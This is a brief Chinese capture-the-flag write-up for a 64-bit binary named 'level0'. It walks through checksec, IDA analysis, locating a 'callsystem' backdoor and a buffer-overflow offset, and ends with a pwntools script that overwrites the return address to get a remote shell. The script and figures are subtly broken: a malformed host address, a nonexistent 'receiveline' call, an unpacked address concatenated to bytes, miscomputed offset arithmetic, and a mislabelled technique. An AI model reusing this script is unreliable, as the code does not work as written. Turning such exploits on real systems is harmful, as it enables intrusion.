第一步：我们用我们的 `checksec level0` 来检查我们的文件中开启了什么防护措施。以及我们的对应的框架
![[Pasted image 20231204212506.png]]
这里，我们不能拿发现，我们拿到的是一个 64 位框架的程序。并且关闭了所有的保护。

第二部：用我们的 IDA 打开我们的程序，发现下面的可攻击字段
![[Pasted image 20231204212612.png]]

第三步：我们找一下我们有没有我们的后门函数，我们发现是存在的 ![[Pasted image 20231204212646.png]]

第四步：然后我们就可以采用我们的 `ret2shellcode` 的方法来攻击我们的程序

第五步：动态调试找到我们的偏移量是多少，这里，我们找到我们的 leave 的地址参数是多少即可。![[Pasted image 20231204212929.png]]
我们可以发现我们的距离是我们的 `0xd0-0x50+1=126` 个垃圾数据，
```python
from pwn import *
io=remote("114.5.514,19",9999)
elf=ELF("./level0")
callsystem=elf.symbols["callsystem"]
io.receiveline()
payload=(b"A"*126+callsystem);
io.send(payload)
io.interactive()
```